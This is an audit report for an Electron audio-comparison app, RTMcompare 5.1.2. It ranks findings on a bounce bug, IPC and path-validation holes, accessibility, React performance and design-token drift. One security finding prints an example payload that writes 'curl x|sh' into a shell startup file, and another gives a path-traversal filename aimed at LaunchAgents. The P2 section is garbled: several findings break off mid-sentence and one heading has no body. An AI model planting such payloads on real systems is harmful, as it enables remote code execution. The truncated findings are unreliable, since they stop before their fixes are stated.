# RTMcompare 5.1.2 — multi-skill audit (2026-05-05)

Consolidated findings from 7 parallel skill audits run against the codebase
post-5.1.2 ship. Skills run: **code-reviewer · senior-security ·
react-best-practices · webapp-testing · ui-ux-pro-max · frontend-design ·
ui-design-system**. (Skipped: senior-frontend / -backend / -fullstack as
overlapping with the above; brainstorming + senior-prompt-engineer as not
applicable to this code-review pass.)

---

## P0 — must fix this sprint

### 1. Bounce ignores `bandEnabled[]` toggles → silent correctness gap
**Source:** code-reviewer
**Where:** `src/components/ApplyBounceButton.tsx:43-100` (call site:
`MatchReferenceEQPanel.tsx:430` passes `scaledBands` un-filtered).
The user can bypass an EQ band in the live preview, hear it sound right,
then click Apply & Bounce — the rendered WAV silently re-includes the
bypassed band because the bounce is fed `scaledBands`, while the preview
filters by `bandEnabled[]`. **Effort: S** (one prop + one `.filter`).

### 2. `python -c` Python source-injection in `declick-preview` shim
**Source:** senior-security
**Where:** `electron/main.ts:779-817`. The `render-corrected-eq` handler
(line 615) does this safely (only `JSON.stringify(pythonDir)` constant +
JSON-over-stdin), but the parallel `declick-preview` shim numeric-
interpolates renderer-supplied `args.sensitivity / .skew / .widenMs`
straight into Python source. A renderer compromise (XSS in any future
panel, malicious profile JSON, poisoned `~/.rtm/incoming/*.rtm.json`)
gets arbitrary Python execution with the user's full disk rights.
**Effort: S** — pass all params via stdin like `render-corrected-eq` does.

### 3. `~/.rtm/incoming/` watcher accepts unvalidated filenames
**Source:** senior-security
**Where:** `electron/main.ts:1077-1088`. `fs.watch` triggers on any
`.ready` filename; the handler strips `.ready`, appends `.wav`/`.rtm.json`,
and `fs.renameSync`s without `path.basename`/traversal validation. Any
local process (incl. malware) can drop `../../Library/LaunchAgents/x.plist.ready`
into the dir and have RTMcompare move arbitrary files. The DAW plugin
shares this dir, widening the attack surface. **Effort: M** — strict
`^[A-Za-z0-9_.-]+\.ready$` regex + `path.basename` round-trip + treat
`meta` JSON fields as untrusted in the renderer.

### 4. `write-sidecar` IPC has no extension gate
**Source:** senior-security
**Where:** `electron/main.ts:1390-1402`. `assertSafeAudioPath` only
checks "regular file exists" — extension isn't enforced (unlike
`read-audio-file`). A renderer compromise can call
`writeSidecar('/Users/x/.zshrc', '.evil', 'curl x|sh')`. **Effort: S**
— enforce `AUDIO_EXT.has(extname(filePath))` and pin sidecar writes to
the source file's parent dir only.

### 5. No CSP, no `setWindowOpenHandler`, no Electron Fuses / asar integrity
**Source:** senior-security
**Where:** `electron/main.ts:115-167` and `index.html`. With
`sandbox: false` (justified for `File.path`), no CSP standing between
the renderer and IPC means any reflected/stored XSS (malicious profile
name, declick output, plugin meta) immediately reaches the IPC layer
including findings #2–#4 above. **Effort: S** — strict CSP meta tag,
`setWindowOpenHandler(() => ({action:'deny'}))`, `will-navigate` blocker.

### 6. SpectrumOverlay has zero a11y — flagship visual is screen-reader-invisible
**Source:** ui-ux-pro-max
**Where:** `src/components/SpectrumOverlay.tsx` (entire 435-line component).
No `role`, no `aria-label`, no keyboard handler, no live region, no
data-table fallback. Screen-reader users cannot perceive the EQ
comparison; keyboard users cannot solo a band. Annotation labels at
`text-[9px]` (clamped to 11px) on translucent `rgba(20,19,19,0.85)` fail
contrast. **Effort: L** — `role="img"` with summarising `aria-label`,
hidden `<table>` of band/dB pairs, tab-navigable strips with arrow-key
selection + `aria-live="polite"` for soloed frequency.

### 7. Hardcoded inline colors fail WCAG AA on dark ground
**Source:** ui-ux-pro-max
**Where:** `AnalysisView.tsx:271,493,518,863`; `CommandPalette.tsx:110,118,162`;
35+ sites repo-wide. `color: '#57534e'` ≈3.0:1 on `#0e0d0b` (fails AA);
`#6a6459` ≈3.6:1 (fails for body); `text-sand-700` (`#2a2722`) ≈1.4:1
(invisible). **Effort: M** — find/replace inline hex with the tuned
`text-sand-*` utilities (300/400 only for body) + add a stylelint rule
banning inline `color: '#xxx'`.

### 8. Live TP-meter rAF triggers full ABPlayer re-render every frame
**Source:** react-best-practices
**Where:** `src/components/ABPlayer.tsx:680-687`. `setTpLiveDb(db)` and
`setTpPeakDb(db)` fire ~60×/s during playback — re-rendering the entire
1707-line `ABPlayer` plus every consumer of its derived state. Single
biggest perf win in the app. **Effort: S** — push values to a ref, have
a small `<TpMeter />` child read via `useSyncExternalStore` (or its own
internal rAF). Companion fix: wrap `ModesContext` provider value in
`useMemo` (`ModesContext.tsx:178-183` — currently re-renders every
consumer on every parent render).

## P1 — should fix soon

### 9. `as any` epidemic on a fully-typed `AnalysisResult`
**Source:** code-reviewer + senior-frontend (carried over because
unanimous)
**Where:** 89 `as any` casts across 20 files; egregious cluster in
`App.tsx:551-600` and `SongDetailPanel.tsx:915-922` casting fields that
**already exist on `AnalysisResult` in `types.ts:353-382`**. The casts
silently bypass the contract `strict: true` is supposed to provide.
**Effort: M** — delete the casts, let `tsc` find the real drift, add an
ESLint rule banning `as any` on `AnalysisResult`/`FileInfo`.

### 10. Zero error boundaries — one throw kills the whole app + leaks AudioContext
**Source:** senior-frontend (carried — strong finding)
**Where:** `src/main.tsx:18-32`. No top-level `<ErrorBoundary>`. If
`SpectrumOverlay` divides by zero on a malformed FFT, or a stem worker
rejects, the entire React tree unmounts mid-playback — the audio graph
in `ABPlayer` (Web Audio nodes, RAF loops) leaks because cleanup
`useEffect`s never run. **Effort: S** — one app-level boundary + one
inside `AnalysisView`'s tab switch (`AnalysisView.tsx:64`).

### 11. Zero automated UI tests
**Source:** webapp-testing
No vitest/jest/playwright in `devDependencies`; no `*.test.ts(x)`
anywhere; 39 `ipcMain.handle` endpoints + 70+ React components ship
untested. **Effort: 1 afternoon for skeleton + 3 happy-path Playwright
tests.** Critical paths to cover first: (1) app boots + bridge alive;
(2) A/B compare end-to-end (renderer → IPC → Python → result schema);
(3) Single-file QC. Defer batch/ABPlayer tests to a follow-up sprint.

### 12. `ApplyBounceButton.tsx:46-49 vs 131` — comment contradiction
**Source:** code-reviewer
Line 46-49 says "Default OFF — opt-in." Line 131 says "Default ON
(beta-tester ask)." `useState(false)` matches line 46; line 131 is
stale and will mislead the next reader. **Effort: S** — one line.

### 13. `python/apply_eq.py:413` — dead-ternary type bug
**Source:** code-reviewer
`write_dtype = np.float32 if out_subtype in ("FLOAT","DOUBLE") else np.float32`
— both branches identical. PCM_24 sources get written from a float32
buffer (downcast happens in `sf.write`, but the variable name lies).
**Effort: S** — change second arm to `np.float64` so soundfile does the
PCM downconvert from a higher-precision buffer.

### 14. `activeProc` is single-slot — concurrent jobs orphan each other
**Source:** senior-backend (carried — strong finding)
**Where:** `electron/python-bridge.ts:6` plus 9 IPC handlers in
`main.ts` that spawn Python *outside* this tracker (render-corrected-eq,
master-chain-render, encoded-preview-render, translation-render,
references-add, declick-*). `cancel-analysis` only kills the most
recent comparator and leaks every other subprocess. **Effort: M** —
`Map<id, ChildProcess>` keyed by IPC-issued job id.

### 15. No subprocess timeouts; unbounded stdout buffering
**Source:** senior-backend
**Where:** `electron/python-bridge.ts:147` and every `spawn(...)` site
in `main.ts`. A wedged Python (numba JIT thrash, demucs deadlock) hangs
the UI's pending Promise forever. A runaway script that prints unbounded
JSON arrays grows main-process RSS until kill. **Effort: S** — per-handler
timeout (env-tunable) + stdout-buffer cap that aborts past N MB +
typed `BackendError` for clean renderer mapping.

### 16. Whole-file audio loads — 60-min 96 kHz/24-bit 5.1 = 7.5 GB float64
**Source:** senior-backend
**Where:** `python/apply_eq.py:347`, `python/master_chain.py:380`,
`python/comparator.py:1330,1462`. Every entry point does `sf.read(...)`
+ `np.empty_like(..., dtype=float64)` (doubles memory again). No
`sf.info()` precheck, no chunked path. **Effort: S** for the
size-budget guard, **L** for proper `sf.blocks()`-based streaming
(`sosfilt` accepts `zi` for stateful chunked filtering).

### 17. CategoryCard rainbow shatters the Console-Didone trinity
**Source:** frontend-design
**Where:** `src/components/CategoryCard.tsx:11-22`. Declares
pink/orange/violet/blue/amber/emerald/yellow/cyan/purple/red plus emoji
icons (🎤, 🎹). The "single warm-gold accent per composition" rule is
broken in every render. **Effort: M** — drop the per-category palette;
encode category through typography + position (small-caps section
label) and a single 4-step warm grayscale for bar fills; reserve gold
for the reference/B-channel only; replace emoji with the existing
geometric glyphs (◎, ⬤, ✦) consistently.

### 18. Display face is sans-serif, not Didone
**Source:** frontend-design
**Where:** `styles.css:56,64`. `body` and **all of `h1/h2/h3` are
'Outfit'**. The philosophy demands a Didone-descended serif. Only two
files use a serif (`SongDetailPanel.tsx:415`, `ShellModuleStore.tsx:41`)
— and they use Playfair Display, not Instrument Serif (which the PDF
docs use). The named system "Console Didone" currently renders in
Outfit. **Effort: M** — load Instrument Serif as `--font-display`;
route h1/h2 + numeric monumentals (LUFS readouts, verdict titles)
through it; keep Outfit only for body/small-caps.

### 19. No code-splitting — Atmos / Batch / Album panels load on cold start
**Source:** react-best-practices
**Where:** `src/App.tsx:1-17` and `AnalysisView.tsx:1-48`. Every screen
imports `BatchView` (1884 lines), `RefOnlyView` (1321 lines), all 6
`Atmos*` panels (~42 KB), `ClientReportButton` (1075 lines),
`EngineerTipsPanel` (1295 lines) eagerly. Bundle = 874 KB raw / 252 KB
gzip in **one chunk**. **Effort: M** — `React.lazy` per top-level mode
(single / compare / batch) and per Atmos tab. Splits initial JS by
~40-50% with one day of work; Vite needs no config.

## P2 — when there's slack

### 20. Inline-style hex epidemic — 1528 hex literals across 102 files
**Source:** ui-design-system
- `#d0b066` (gold) appears **214 times** as a hardcoded inline string
- `#8d867b` (already a defined token) appears **129 times**
- `#7a7164` (drift value, not in palette) appears **103 times**
- `#c5a55a` (legacy gold) coexists with `#d0b066` — **two golds**
- 1,151 `style={{...}}` blocks bypass the carefully-tuned `@theme` tokens

The `styles.css` `@theme` block is solid (Tailwind v4, dark/light, WCAG-
tuned). It just isn't being used. **Effort: 8–10 h total** — Step 1
(15 min): add semantic aliases to `@theme` (`--color-text-primary`,
`--color-bg-panel`, `--color-accent`, etc.). Step 2 (1.5 h): codemod
the top 6 hex values across `src/`. Step 3 (6-8 h): hottest files
manually + lint rule banning hex literals in `.tsx`.

### 21. TonalIssues invents a second palette unrelated to tokens
**Source:** frontend-design
**Where:** `TonalIssues.tsx:39-47`. Hardcodes `#6b8cbb`, `#8b7355`,
`#a87832`, `#e05a5a`, `#d4784f` — none of which are CSS variables.
**Effort: S** — collapse all six issues to `--color-warm-red` (severity

### 22. Verdict tag is a generic SaaS chip, not a colophon mark

### 23. Cognitive overload on first compare — 8 tabs + cockpit + badges + tooltips
**Source:** ui-ux-pro-max
**Where:** `AnalysisView.tsx:232-368`. First-render assault on Hick's
law. **Effort: M** — progressively disclose `CockpitStrip` (collapsed

### 24. Microcopy inconsistency in error/empty states
**Source:** ui-ux-pro-max
Tone whipsaws between conversational ("That drop didn't include a
file. If it's an iCloud/Dropbox placeholder…") and clinical

copy-to-clipboard actions have no toast feedback. **Effort: S** —
rewrite drop errors as `Couldn't read this file's path. Click to

### 25. SpectrumOverlay re-spreads 31-element arrays + reruns annotation pass on every render
**Source:** react-best-practices
**Where:** `SpectrumOverlay.tsx:281` and `:313-360`. Wrap the component

single loop. **Effort: S**.

## Recommended sprint plan

**Sprint 1 (one week):** P0s 1–8 plus P1s 9, 10, 11, 12, 13.
Net effect: silently-wrong bounce fixed, three remote-code-execution
paths closed, a11y baseline established (one chart + the contrast
sweep), screen-reader floor set, perf jank gone from the live meter,
the type contract restored, and an automated-test skeleton standing.

**Sprint 2 (one week):** P1s 14–19. Backend reliability (timeouts,
job tracking, memory budget), frontend consistency (CategoryCard
rainbow, Didone display face), bundle split.

**Backlog:** P2s 20–26 are the "when there's slack" pile — high
value over time, no urgency.

**Honest summary:** the codebase is in genuinely good shape for a
single-engineer audio app — strong design system, deliberate error
paths, recent feature work shows real attention to user feedback. The
two systemic risks are (1) the `as any` epidemic that disarms `tsc`
and (2) the 30-line gap in IPC/path validation that turns any future
renderer compromise into local code execution. Those two patterns
account for half the P0/P1 list. Fix them once, structurally, and the
audit report shrinks dramatically.
